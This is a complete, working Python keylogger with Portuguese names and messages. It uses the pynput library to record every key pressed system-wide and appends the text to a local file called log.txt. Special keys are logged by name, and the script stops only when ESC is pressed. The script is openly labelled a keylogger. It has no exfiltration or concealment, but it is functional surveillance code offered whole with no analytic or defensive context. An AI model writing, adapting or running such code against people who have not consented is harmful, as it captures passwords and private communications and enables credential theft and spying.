from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    
    keyboard.Key.tab, 
    keyboard.Key.home, keyboard.Key.end,
    keyboard.Key.page_up, keyboard.Key.page_down,
    keyboard.Key.left, keyboard.Key.right,
    keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.insert, keyboard.Key.delete,
    
    keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4,
    keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8,
    keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12,
}

def on_press(key):
    char_to_write = None

    try:
        char_to_write = key.char
        
    except AttributeError:
        
        if key in IGNORAR:
            return
        
        elif key == keyboard.Key.space:
            char_to_write = " "
        elif key == keyboard.Key.enter:
            char_to_write = "\n"
        elif key == keyboard.Key.backspace:
            return 
        
        else:
            char_to_write = f" [{key.name}] "

    if char_to_write is not None:
        try:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(str(char_to_write))
        except Exception as e:
            print(f"Erro ao salvar o log: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[ Keylogger encerrado pela tecla ESC ]")
        return False
    
if __name__ == "__main__":
    print("Keylogger iniciado. Pressione teclas. Pressione ESC para parar.")

    with keyboard.Listener(
        on_press=on_press, 
        on_release=on_release
    ) as listener:
        listener.join()